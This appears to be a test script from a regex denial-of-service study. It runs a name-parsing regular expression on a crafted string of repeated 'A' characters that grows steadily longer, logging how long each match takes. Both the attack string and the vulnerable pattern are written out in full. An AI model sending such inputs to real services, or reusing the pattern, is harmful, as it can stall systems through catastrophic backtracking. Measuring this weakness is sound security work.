/* 2075
 * (?<LastName>[A-Z]\w+\-?[A-Z]?\w*),\s(?<Suffix>Jr\.|Sr\.|IV|III|II)?,?\s?(?<FirstName>[A-Z]\w*\-?[A-Z]?\w*\.?)\s?(?<MiddleName>[A-Z]?\w*\.?)
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"A1, "+"A"*512+"! _1SLQ_2"
 */
var REGEX = /(?<LastName>[A-Z]\w+\-?[A-Z]?\w*),\s(?<Suffix>Jr\.|Sr\.|IV|III|II)?,?\s?(?<FirstName>[A-Z]\w*\-?[A-Z]?\w*\.?)\s?(?<MiddleName>[A-Z]?\w*\.?)/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = 'A1, ' + 'A'.repeat(i*1) + '! _1SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}